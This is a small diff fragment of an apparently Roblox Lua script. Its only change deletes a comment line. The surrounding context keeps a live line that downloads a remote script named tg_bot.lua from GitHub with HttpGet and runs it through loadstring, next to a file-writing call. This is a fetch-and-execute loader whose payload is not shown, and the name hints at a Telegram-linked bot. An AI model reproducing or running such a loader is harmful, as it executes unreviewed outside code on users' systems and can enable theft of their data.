@@ -16,7 +16,6 @@ task.spawn(function()
     end
         
     loadstring(game:HttpGet("https://raw.githubusercontent.com/repositorykreml1n/commands/refs/heads/main/tg_bot.lua",true))()
--- ========================================================
         
     if writefile then
         pcall(function()
